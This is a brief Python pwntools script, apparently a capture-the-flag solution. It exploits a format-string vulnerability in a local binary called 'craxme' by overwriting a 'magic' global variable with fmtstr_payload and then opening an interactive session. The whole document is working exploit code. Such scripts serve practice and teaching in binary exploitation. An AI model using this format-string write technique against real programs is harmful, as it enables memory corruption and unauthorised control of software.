from pwn import *

s = process("./craxme")

elf = ELF("./craxme")

magic = 0x0804A038

s.recvuntil(":")

pay = fmtstr_payload(7,{magic:0xDA})
print pay

s.send(pay)


s.interactive()
